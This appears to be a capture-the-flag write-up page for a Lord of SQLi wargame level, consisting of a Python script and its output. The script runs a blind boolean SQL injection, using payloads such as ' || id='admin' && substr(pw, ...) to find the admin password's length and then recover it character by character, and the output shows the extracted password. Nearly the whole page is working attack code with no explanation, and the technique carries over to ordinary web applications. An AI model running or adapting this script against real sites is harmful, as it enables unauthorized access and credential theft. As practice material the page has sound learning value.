---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 7
---


## Script

```py title="orge_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'jeae4igtrh2cq92r63ob4kqmqr'}
url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
password_length = 0

for x in range(0, 10):
  payload = f"' || id='admin' && length(pw)={x} -- -"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?pw={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "Hello admin" in response.text:
    password_length = x
    break

print()    
print(f"Payload: ?pw={payload}")
print(f"Password length: {password_length}")
print()

password = ""
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"' || id='admin' && substr(pw, {index}, 1)='{char}' -- -"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?pw={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "Hello admin" in response.text:
      password += char
      print(f"Payload: ?pw={payload}")
      print(f"Character at index {index}: {char}")
      break

print()
print(f"Extracted Password: {password}")
print(f"Final payload: ?pw={password}")
```

```
$ python .\losqli.py

Payload: ?pw=' || id='admin' && length(pw)=8 -- -
Password length: 8

Payload: ?pw=' || id='admin' && substr(pw, 1, 1)='7' -- -
Character at index 1: 7
Payload: ?pw=' || id='admin' && substr(pw, 2, 1)='b' -- -
Character at index 2: b
Payload: ?pw=' || id='admin' && substr(pw, 3, 1)='7' -- -
Character at index 3: 7
Payload: ?pw=' || id='admin' && substr(pw, 4, 1)='5' -- -
Character at index 4: 5
Payload: ?pw=' || id='admin' && substr(pw, 5, 1)='1' -- -
Character at index 5: 1
Payload: ?pw=' || id='admin' && substr(pw, 6, 1)='a' -- -
Character at index 6: a
Payload: ?pw=' || id='admin' && substr(pw, 7, 1)='e' -- -
Character at index 7: e
Payload: ?pw=' || id='admin' && substr(pw, 8, 1)='c' -- -
Character at index 8: c     

Extracted Password: 7b751aec
Final payload: ?pw=7b751aec 
```
